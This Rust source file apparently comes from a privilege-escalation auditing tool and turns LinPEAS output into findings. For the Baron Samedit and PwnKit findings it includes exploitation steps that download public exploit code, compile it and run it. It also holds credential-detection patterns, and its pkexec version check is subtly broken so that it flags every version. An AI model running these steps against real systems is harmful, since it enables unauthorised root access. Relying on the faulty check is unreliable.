use regex::Regex;
use std::collections::HashSet;

use super::linux::*;
use super::types::*;

/// URL to download LinPEAS
pub const LINPEAS_URL: &str = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh";

/// Parse LinPEAS output into structured findings
pub fn parse_linpeas_output(output: &str) -> Vec<PrivescFinding> {
    let mut findings = Vec::new();

    // LinPEAS uses color codes and special formatting
    // We'll look for specific sections

    // Section markers in LinPEAS output (with ANSI colors stripped)
    // Type annotation required for heterogeneous function items
    type SectionParser = fn(&str) -> Vec<PrivescFinding>;
    let sections: [(&str, SectionParser); 14] = [
        ("╔══════════╣ SUID", parse_suid_section),
        ("╔══════════╣ Sudo version", parse_sudo_version_section),
        ("╔══════════╣ Checking 'sudo -l'", parse_sudo_l_section),
        ("╔══════════╣ Capabilities", parse_capabilities_section),
        ("╔══════════╣ Files with capabilities", parse_capabilities_section),
        ("╔══════════╣ Users with console", parse_users_section),
        ("╔══════════╣ Cron jobs", parse_cron_section),
        ("╔══════════╣ Analyzing NFS Exports", parse_nfs_section),
        ("╔══════════╣ Interesting writable files", parse_writable_files_section),
        ("╔══════════╣ Passwords inside", parse_passwords_section),
        ("╔══════════╣ Searching passwords in", parse_passwords_section),
        ("╔══════════╣ Analyzing SSH", parse_ssh_section),
        ("╔══════════╣ Docker", parse_docker_section),
        ("╔══════════╣ Checking Pkexec", parse_pkexec_section),
    ];

    // Strip ANSI color codes
    let clean_output = strip_ansi_codes(output);

    // Extract and parse each section
    for (marker, parser) in &sections {
        if let Some(section) = extract_section(&clean_output, marker) {
            findings.extend(parser(&section));
        }
    }

    // Look for CVE mentions
    findings.extend(parse_cve_mentions(&clean_output));

    // Parse kernel version for exploits
    if let Some(kernel) = extract_kernel_version(&clean_output) {
        findings.extend(check_kernel_exploits(&kernel));
    }

    // Deduplicate findings
    deduplicate_findings(&mut findings);

    findings
}

/// Strip ANSI escape codes from output
fn strip_ansi_codes(input: &str) -> String {
    let ansi_regex = Regex::new(r"\x1B\[[0-9;]*[a-zA-Z]").unwrap();
    ansi_regex.replace_all(input, "").to_string()
}

/// Extract a section from LinPEAS output
fn extract_section(output: &str, start_marker: &str) -> Option<String> {
    let start = output.find(start_marker)?;
    let section_start = output[start..].lines().next()?;

    // Find the next section (marked by ╔══════════╣) or end of output
    let rest = &output[start + section_start.len()..];
    let end = rest
        .find("╔══════════╣")
        .or_else(|| rest.find("╚══════════════════════"))
        .unwrap_or(rest.len());

    Some(rest[..end].to_string())
}

/// Extract kernel version from output
fn extract_kernel_version(output: &str) -> Option<String> {
    let kernel_regex = Regex::new(r"Linux version (\d+\.\d+\.\d+[^\s]*)").ok()?;
    if let Some(caps) = kernel_regex.captures(output) {
        return caps.get(1).map(|m| m.as_str().to_string());
    }

    // Also try from uname line
    let uname_regex = Regex::new(r"uname -a[:\s]+.*?(\d+\.\d+\.\d+[^\s]*)").ok()?;
    if let Some(caps) = uname_regex.captures(output) {
        return caps.get(1).map(|m| m.as_str().to_string());
    }

    None
}

/// Parse SUID section from LinPEAS
fn parse_suid_section(section: &str) -> Vec<PrivescFinding> {
    let mut suid_output = String::new();

    for line in section.lines() {
        let line = line.trim();
        // LinPEAS highlights interesting binaries
        if line.starts_with('/') || line.contains("usr/bin") || line.contains("usr/sbin") {
            suid_output.push_str(line);
            suid_output.push('\n');
        }
    }

    parse_suid_binaries(&suid_output)
}

/// Parse sudo version section
fn parse_sudo_version_section(section: &str) -> Vec<PrivescFinding> {
    let mut findings = Vec::new();

    // Look for vulnerable sudo versions
    let version_regex = Regex::new(r"Sudo version (\d+\.\d+\.\d+)").ok();
    if let Some(ref regex) = version_regex {
        if let Some(caps) = regex.captures(section) {
            if let Some(version) = caps.get(1) {
                let ver = version.as_str();

                // Check for Baron Samedit (CVE-2021-3156)
                // Affected: sudo < 1.9.5p2
                let parts: Vec<u32> = ver.split('.').filter_map(|p| {
                    p.chars().take_while(|c| c.is_ascii_digit()).collect::<String>().parse().ok()
                }).collect();

                if parts.len() >= 3 {
                    let (major, minor, patch) = (parts[0], parts[1], parts[2]);
                    if major == 1 && minor < 9 || (major == 1 && minor == 9 && patch < 5) {
                        let mut finding = PrivescFinding::new_linux(
                            PrivescSeverity::Critical,
                            "Sudo Baron Samedit (CVE-2021-3156)".to_string(),
                            format!(
                                "Sudo version {} is vulnerable to CVE-2021-3156 (Baron Samedit). \
                                 This allows any local user to gain root privileges.",
                                ver
                            ),
                            LinuxPrivescVector::KernelExploit {
                                kernel_version: ver.to_string(),
                                cve: "CVE-2021-3156".to_string(),
                                exploit_name: "Baron Samedit".to_string(),
                                probability: "high".to_string(),
                            },
                        );

                        finding.exploitation_steps = vec![
                            "Download exploit: git clone https://github.com/blasty/CVE-2021-3156.git".to_string(),
                            "Compile: make".to_string(),
                            "Run: ./sudo-hax-me-a-sandwich".to_string(),
                        ];
                        finding.references.push(
                            "https://nvd.nist.gov/vuln/detail/CVE-2021-3156".to_string(),
                        );
                        finding.mitre_techniques.push("T1068".to_string());

                        findings.push(finding);
                    }
                }
            }
        }
    }

    findings
}

/// Parse sudo -l section
fn parse_sudo_l_section(section: &str) -> Vec<PrivescFinding> {
    parse_sudo_rules(section)
}

/// Parse capabilities section
fn parse_capabilities_section(section: &str) -> Vec<PrivescFinding> {
    parse_capabilities(section)
}

/// Parse users section
fn parse_users_section(section: &str) -> Vec<PrivescFinding> {
    let findings = Vec::new();

    // Look for users with shell access
    for line in section.lines() {
        if line.contains("/bin/bash") || line.contains("/bin/sh") || line.contains("/bin/zsh") {
            // Could add user enumeration findings here
        }
    }

    findings
}

/// Parse cron jobs section
fn parse_cron_section(section: &str) -> Vec<PrivescFinding> {
    let writable_paths: HashSet<String> = HashSet::new(); // Would need actual writable path detection
    parse_crontabs(section, &writable_paths)
}

/// Parse NFS section
fn parse_nfs_section(section: &str) -> Vec<PrivescFinding> {
    check_nfs_no_root_squash(section)
}

/// Parse writable files section
fn parse_writable_files_section(section: &str) -> Vec<PrivescFinding> {
    let mut findings = Vec::new();

    // Look for critical writable files
    let critical_files = [
        ("/etc/passwd", "User database - can add root user"),
        ("/etc/shadow", "Password hashes - can change passwords"),
        ("/etc/sudoers", "Sudo rules - can add sudo privileges"),
        ("/root/.ssh/authorized_keys", "Root SSH keys - can add own key"),
    ];

    for line in section.lines() {
        let line = line.trim();
        for (file, desc) in &critical_files {
            if line.contains(file) {
                let mut finding = PrivescFinding::new_linux(
                    PrivescSeverity::Critical,
                    format!("Writable Critical File: {}", file),
                    format!("Critical file '{}' is writable. {}", file, desc),
                    LinuxPrivescVector::WritablePasswd {
                        file: file.to_string(),
                        writable: true,
                    },
                );

                finding.mitre_techniques.push("T1222.002".to_string());
                findings.push(finding);
                break;
            }
        }
    }

    // Look for writable PATH directories
    for line in section.lines() {
        if line.contains("PATH") && (line.contains("/tmp") || line.contains("writable")) {
            let finding = PrivescFinding::new_linux(
                PrivescSeverity::Medium,
                "Writable PATH Directory".to_string(),
                format!("Writable directory in PATH: {}", line),
                LinuxPrivescVector::WritablePath {
                    directory: line.to_string(),
                },
            );
            findings.push(finding);
        }
    }

    findings
}

/// Parse passwords section
fn parse_passwords_section(section: &str) -> Vec<PrivescFinding> {
    let mut findings = Vec::new();
    let password_patterns = [
        (r"password\s*[=:]\s*\S+", "Password found"),
        (r"passwd\s*[=:]\s*\S+", "Password found"),
        (r"pwd\s*[=:]\s*\S+", "Password found"),
        (r"DB_PASSWORD\s*[=:]\s*\S+", "Database password"),
        (r"API_KEY\s*[=:]\s*\S+", "API key found"),
        (r"SECRET_KEY\s*[=:]\s*\S+", "Secret key found"),
    ];

    for line in section.lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }

        for (pattern, description) in &password_patterns {
            if let Ok(regex) = Regex::new(&format!("(?i){}", pattern)) {
                if regex.is_match(line) {
                    // Mask the actual password in the finding
                    let masked_line = regex.replace_all(line, |caps: &regex::Captures| {
                        let matched = caps.get(0).map(|m| m.as_str()).unwrap_or("");
                        let parts: Vec<&str> = matched.splitn(2, |c| c == '=' || c == ':').collect();
                        if parts.len() == 2 {
                            format!("{}=***MASKED***", parts[0])
                        } else {
                            matched.to_string()
                        }
                    });

                    let finding = PrivescFinding::new_linux(
                        PrivescSeverity::High,
                        description.to_string(),
                        format!("Potential credential found: {}", masked_line),
                        LinuxPrivescVector::PasswordInFile {
                            path: "LinPEAS output".to_string(),
                            line_hint: masked_line.to_string(),
                        },
                    );
                    findings.push(finding);
                    break;
                }
            }
        }
    }

    findings
}

/// Parse SSH section
fn parse_ssh_section(section: &str) -> Vec<PrivescFinding> {
    let mut findings = Vec::new();

    // Look for accessible SSH keys
    for line in section.lines() {
        let line = line.trim();
        if line.contains("id_rsa") || line.contains("id_dsa") || line.contains("id_ecdsa") {
            if !line.contains("Permission denied") {
                let finding = PrivescFinding::new_linux(
                    PrivescSeverity::High,
                    "Accessible SSH Key".to_string(),
                    format!("SSH private key found: {}", line),
                    LinuxPrivescVector::SshKey {
                        path: line.to_string(),
                        owner: "unknown".to_string(),
                        accessible: true,
                    },
                );
                findings.push(finding);
            }
        }
    }

    findings
}

/// Parse Docker section
fn parse_docker_section(section: &str) -> Vec<PrivescFinding> {
    let mut findings = Vec::new();

    if section.contains("docker.sock") || section.contains("docker:") || section.contains("Is docker remaining") {
        if let Some(finding) = check_docker_socket(section) {
            findings.push(finding);
        }
    }

    findings
}

/// Parse Pkexec section
fn parse_pkexec_section(section: &str) -> Vec<PrivescFinding> {
    let mut findings = Vec::new();

    // Check for CVE-2021-4034 (PwnKit)
    if section.contains("Vulnerable") || section.contains("pkexec") {
        let version_regex = Regex::new(r"pkexec version (\d+\.\d+)").ok();
        if let Some(ref regex) = version_regex {
            if let Some(caps) = regex.captures(section) {
                if let Some(version) = caps.get(1) {
                    let ver = version.as_str();
                    let parts: Vec<f32> = ver.split('.').filter_map(|p| p.parse().ok()).collect();

                    // CVE-2021-4034 affects polkit < 0.120
                    if parts.first().copied().unwrap_or(0.0) < 0.120 {
                        let mut finding = PrivescFinding::new_linux(
                            PrivescSeverity::Critical,
                            "PwnKit (CVE-2021-4034)".to_string(),
                            format!(
                                "Polkit version {} is vulnerable to CVE-2021-4034 (PwnKit). \
                                 This allows any local user to gain root privileges.",
                                ver
                            ),
                            LinuxPrivescVector::KernelExploit {
                                kernel_version: ver.to_string(),
                                cve: "CVE-2021-4034".to_string(),
                                exploit_name: "PwnKit".to_string(),
                                probability: "high".to_string(),
                            },
                        );

                        finding.exploitation_steps = vec![
                            "Download exploit: curl https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.c -o pwnkit.c".to_string(),
                            "Compile: gcc pwnkit.c -o pwnkit".to_string(),
                            "Run: ./pwnkit".to_string(),
                        ];
                        finding.references.push("https://nvd.nist.gov/vuln/detail/CVE-2021-4034".to_string());
                        finding.mitre_techniques.push("T1068".to_string());

                        findings.push(finding);
                    }
                }
            }
        }
    }

    findings
}

/// Parse CVE mentions in output
fn parse_cve_mentions(output: &str) -> Vec<PrivescFinding> {
    let mut findings = Vec::new();
    let cve_regex = Regex::new(r"CVE-\d{4}-\d+").ok();
    let mut seen_cves: HashSet<String> = HashSet::new();

    if let Some(ref regex) = cve_regex {
        for caps in regex.captures_iter(output) {
            if let Some(cve) = caps.get(0) {
                let cve_str = cve.as_str();
                if !seen_cves.contains(cve_str) {
                    seen_cves.insert(cve_str.to_string());

                    // Check if it's a high-priority CVE
                    let known_critical = [
                        "CVE-2021-3156",   // Baron Samedit
                        "CVE-2021-4034",   // PwnKit
                        "CVE-2022-0847",   // Dirty Pipe
                        "CVE-2016-5195",   // Dirty COW
                        "CVE-2019-14287", // Sudo bypass
                    ];

                    if known_critical.contains(&cve_str) {
                        // Already handled by specific parsers
                        continue;
                    }

                    // Add generic CVE finding
                    let finding = PrivescFinding::new_linux(
                        PrivescSeverity::Medium,
                        format!("CVE Detected: {}", cve_str),
                        format!("LinPEAS detected potential vulnerability: {}", cve_str),
                        LinuxPrivescVector::KernelExploit {
                            kernel_version: "unknown".to_string(),
                            cve: cve_str.to_string(),
                            exploit_name: "Unknown".to_string(),
                            probability: "medium".to_string(),
                        },
                    );
                    findings.push(finding);
                }
            }
        }
    }

    findings
}

/// Remove duplicate findings
fn deduplicate_findings(findings: &mut Vec<PrivescFinding>) {
    let mut seen: HashSet<String> = HashSet::new();
    findings.retain(|f| {
        let key = format!("{}:{}", f.title, f.description);
        if seen.contains(&key) {
            false
        } else {
            seen.insert(key);
            true
        }
    });
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_strip_ansi_codes() {
        let input = "\x1B[1;31mRed text\x1B[0m";
        let output = strip_ansi_codes(input);
        assert_eq!(output, "Red text");
    }

    #[test]
    fn test_extract_kernel_version() {
        let output = "Linux version 5.4.0-42-generic (buildd@lcy01-amd64-002)";
        let version = extract_kernel_version(output);
        assert_eq!(version, Some("5.4.0-42-generic".to_string()));
    }
}
